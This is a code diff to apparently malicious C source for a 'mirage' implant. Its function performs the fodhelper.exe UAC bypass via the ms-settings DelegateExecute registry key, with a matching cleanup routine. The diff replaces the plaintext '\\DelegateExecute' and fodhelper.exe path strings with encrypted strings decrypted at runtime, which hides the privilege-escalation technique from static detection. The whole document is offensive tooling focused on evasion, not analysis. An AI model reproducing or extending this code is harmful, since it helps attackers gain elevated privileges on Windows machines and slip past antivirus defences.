@@ -142,7 +142,9 @@ int mirage_uac_bypass(const char *exe_path) {
     /* Re-decrypt and append \DelegateExecute */
     enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, delegate_path);
     size_t dl = 0; while (delegate_path[dl]) dl++;
-    const wchar_t *suffix = L"\\DelegateExecute";
+    wchar_t suffix[32];
+    enc_decrypt_wide(enc_wDelegateExecute, ENC_WDELEGATEEXECUTE_LEN, suffix);
+    delegate_path[dl++] = L'\\';
     for (int i = 0; suffix[i] && dl < 191; i++, dl++) delegate_path[dl] = suffix[i];
     delegate_path[dl] = L'\0';
 
@@ -155,7 +157,9 @@ int mirage_uac_bypass(const char *exe_path) {
     /* Launch fodhelper.exe to trigger UAC bypass */
     STARTUPINFOW si; memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
     PROCESS_INFORMATION pi = {0};
-    if (g_uac_api.pCreateProcessW(L"C:\\Windows\\System32\\fodhelper.exe", NULL,
+    wchar_t fodhelper[64];
+    enc_decrypt_wide(enc_wfodhelper, ENC_WFODHELPER_LEN, fodhelper);
+    if (g_uac_api.pCreateProcessW(fodhelper, NULL,
                                    NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         g_uac_api.pWaitForSingleObject(pi.hProcess, 5000);
         g_uac_api.pCloseHandle(pi.hProcess);
@@ -177,7 +181,9 @@ int mirage_uac_cleanup(void) {
     wchar_t delegate_path[192];
     enc_decrypt_wide(enc_wreg_mssettings, ENC_WREG_MSSETTINGS_LEN, delegate_path);
     size_t dl = 0; while (delegate_path[dl]) dl++;
-    const wchar_t *suffix = L"\\DelegateExecute";
+    wchar_t suffix[32];
+    enc_decrypt_wide(enc_wDelegateExecute, ENC_WDELEGATEEXECUTE_LEN, suffix);
+    delegate_path[dl++] = L'\\';
     for (int i = 0; suffix[i] && dl < 191; i++, dl++) delegate_path[dl] = suffix[i];
     delegate_path[dl] = L'\0';
 
